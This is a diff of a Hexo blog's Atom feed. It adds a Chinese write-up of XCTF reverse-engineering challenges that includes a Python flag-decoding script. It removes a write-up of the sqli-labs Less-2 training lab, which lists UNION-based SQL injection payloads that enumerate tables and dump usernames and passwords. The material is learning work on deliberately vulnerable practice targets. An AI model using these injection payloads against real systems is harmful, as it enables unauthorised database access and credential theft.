@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2021-04-27T12:09:22.125Z</updated>
+  <updated>2021-05-04T08:22:49.577Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>攻防世界re1</title>
+    <link href="http://example.com/2021/05/04/re1/"/>
+    <id>http://example.com/2021/05/04/re1/</id>
+    <published>2021-05-04T08:03:47.000Z</published>
+    <updated>2021-05-04T08:22:49.577Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="game"><a href="#game" class="headerlink" title="game"></a><strong>game</strong></h2><p><img src="https://wx4.sinaimg.cn/mw1024/007juUiNly1gq6gkek1wqj30xe0grmxo.jpg" alt="img"></p><p>打开程序显示一些符号，让你玩游戏，赢了就有flag</p><p>用OD打开，搜素字符串，找到flag的定位</p><p><img src="https://wx4.sinaimg.cn/mw1024/007juUiNly1gq6gken485j30sa0daq4l.jpg" alt="img"></p><p>运行到这里，运行这个函数，就可以得到flag</p><p>IDA</p><p>放进IDA，找到main函数</p><p><img src="https://wx4.sinaimg.cn/mw1024/007juUiNly1gq6gkek7k3j30d20ft74l.jpg" alt="img"></p><p>进入sub_457AB4()</p><p><img src="https://wx1.sinaimg.cn/mw1024/007juUiNly1gq6gkemtnij30b30iqt93.jpg" alt="img"></p><p>写个脚本运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">arr1 &#x3D; [18, 64, 98, 5, 2, 4, 6, 3, 6, 48, 49, 65, 32, 12, 48, 65, 31, 78, 62, 32, 49, 32,</span><br><span class="line">        1, 57, 96, 3, 21, 9, 4, 62, 3, 5, 4, 1, 2, 3, 44, 65, 78, 32, 16, 97, 54, 16, 44,</span><br><span class="line">        52, 32, 64, 89, 45, 32, 65, 15, 34, 18, 16, 0]</span><br><span class="line">arr2 &#x3D; [123, 32, 18, 98, 119, 108, 65, 41, 124, 80, 125, 38, 124, 111, 74, 49,</span><br><span class="line">        83, 108, 94, 108, 84, 6, 96, 83, 44, 121, 104, 110, 32, 95, 117, 101, 99,</span><br><span class="line">        123, 127, 119, 96, 48, 107, 71, 92, 29, 81, 107, 90, 85, 64, 12, 43, 76, 86,</span><br><span class="line">        13, 114, 1, 117, 126, 0]</span><br><span class="line">str&#x3D;&#39;&#39;</span><br><span class="line">for i in range(0,56):</span><br><span class="line">    arr2[i] ^&#x3D; arr1[i]</span><br><span class="line">    arr2[i] ^&#x3D; 0x13</span><br><span class="line">    str &#x3D;str + chr(arr2[i]);</span><br><span class="line"></span><br><span class="line">print(str)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wx1.sinaimg.cn/mw1024/007juUiNly1gq6gkejmp9j30gy025t8k.jpg" alt="img"></p><h2 id="Hello，CTF"><a href="#Hello，CTF" class="headerlink" title="Hello，CTF"></a><strong>Hello，CTF</strong></h2><p>一个exe，运行结果如下：</p><p><img src="https://winny.work/wp-content/uploads/2019/08/1567821831010.png" alt="1567821831010"></p><p>IDA找到main函数</p><p><img src="https://wx4.sinaimg.cn/mw1024/007juUiNly1gq6gkey9isj30jt0ikjs3.jpg" alt="img"></p><p>a键直接的到flag</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;game&quot;&gt;&lt;a href=&quot;#game&quot; class=&quot;headerlink&quot; title=&quot;game&quot;&gt;&lt;/a&gt;&lt;strong&gt;game&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://wx4.sinaimg.cn/mw1024/007ju</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>PE文件</title>
@@ -399,27 +419,6 @@
       
       
     <summary type="html">&lt;h1 id=&quot;Less-3&quot;&gt;&lt;a href=&quot;#Less-3&quot; class=&quot;headerlink&quot; title=&quot;Less-3&quot;&gt;&lt;/a&gt;Less-3&lt;/h1&gt;&lt;h2 id=&quot;注入点闭合的问题&quot;&gt;&lt;a href=&quot;#注入点闭合的问题&quot; class=&quot;headerlink&quot; </summary>
-      
-    
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>sql-2</title>
-    <link href="http://example.com/2020/11/17/sql-2/"/>
-    <id>http://example.com/2020/11/17/sql-2/</id>
-    <published>2020-11-17T11:23:08.000Z</published>
-    <updated>2020-11-26T11:51:34.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>第二关和第一关思路是一样的</p><p>Less-2和Less-1唯一的区别就是id类型不同了，Less-2的id是一个int类型</p><p>按照上一篇的检测方法</p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mceI02rOuVWHPDHknllOSQ6Kn0S2kgH9X2PWzyouoopc6XTN98hkf59BkDGTfVQEXApE.2sb3uS3RIzlzPaVbbz0!/b&bo=2wb8AQAAAAADJyI!&rf=viewer_4" alt="img"></p><p><img src="http://m.qpic.cn/psc?/V53QcDQN3M0Z4223G6is1vw7KQ0WDRYf/45NBuzDIW489QBoVep5mceI02rOuVWHPDHknllOSQ6LcQMVKB3MiTtpC0OlzZxiyq4XxKG555*p56hYrIyqBX39d7wLznEoBcZrQQY8HhBo!/b&bo=jAbLAQAAAAADJ0I!&rf=viewer_4" alt="img"></p><p><img src="/2020/11/17/sql-2/Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20201117193309346.png" alt="image-20201117193309346"></p><p>接下来就和第一关的一样了</p><p>查看多少列</p><p>id=1 order by 3–+ </p><p>查看什么地方有回显</p><p>id=-1 union select 1,2,3–+</p><p>爆库</p><p>id=-1 union select 1,2,database()–+</p><p>爆表名</p><p>id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’ –+</p><p>爆列名</p><p>id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=‘users’ –+</p><p>爆数据</p><p>?id=-1 union select 1,2,group_concat(concat_ws(‘,’,username,password) separator ‘|’) from users –+</p><h2 id="特殊方法"><a href="#特殊方法" class="headerlink" title="特殊方法"></a>特殊方法</h2><p>or 1=1 或者 and 1=1等直接爆密码，但只能爆出一组。</p><blockquote><p><a href="http://localhost/sql/Less-2/?id=1">http://localhost/sql/Less-2/?id=1</a> or 1=1</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190812175007694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjMyNjY4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;Less-2&quot;&gt;&lt;a href=&quot;#Less-2&quot; class=&quot;headerlink&quot; title=&quot;Less-2&quot;&gt;&lt;/a&gt;Less-2&lt;/h2&gt;&lt;p&gt;第二关和第一关思路是一样的&lt;/p&gt;
-&lt;p&gt;Less-2和Less-1唯一的区别就是id类型不同了，Less-</summary>
       
     
     
